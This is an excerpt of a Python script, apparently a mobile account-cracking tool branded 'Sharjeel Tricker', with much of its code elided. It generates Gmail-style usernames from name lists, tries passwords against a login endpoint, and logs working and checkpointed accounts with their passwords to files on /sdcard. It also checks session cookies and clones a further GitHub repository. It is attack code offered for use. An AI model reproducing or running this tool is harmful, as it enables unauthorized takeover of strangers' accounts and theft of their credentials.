...
\033[1;97m Owner  : Sharjeel Tricker

\033[1;97m GitHub : Sharjeel404
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Sharjeel-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Sharjeel-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Sharjeel-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .Sharjeel')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Sharjeel','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.Sharjeel', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Sharjeel-OK.txt")
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mSharjeel-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/Sharjeel-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSharjeel-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/Sharjeel-CP.txt','a').write(f'{acc} • {pword}\n')
